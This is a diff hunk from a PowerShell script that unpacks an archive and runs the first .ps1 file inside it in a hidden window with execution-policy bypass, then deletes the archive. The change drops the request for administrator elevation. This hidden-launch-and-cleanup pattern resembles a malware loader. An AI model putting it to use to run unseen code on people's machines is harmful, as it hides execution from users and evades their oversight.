@@ -18,10 +18,13 @@ Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
 `$ps1 = Get-ChildItem -Path "`$dest\App" -Filter "*.ps1" -Recurse -File | Select-Object -First 1
 
 if (`$ps1) {
-    Start-Process powershell.exe `
-        -WindowStyle Hidden `
-        -Verb RunAs `
-        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"`$(`$ps1.FullName)`"`" | Out-Null
+    Start-Process -FilePath "powershell.exe" `
+        -ArgumentList @(
+            "-NoProfile"
+            "-ExecutionPolicy", "Bypass"
+            "-File", "`$(`$ps1.FullName)`"
+        ) `
+        -WindowStyle Hidden | Out-Null
 }
 
 Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
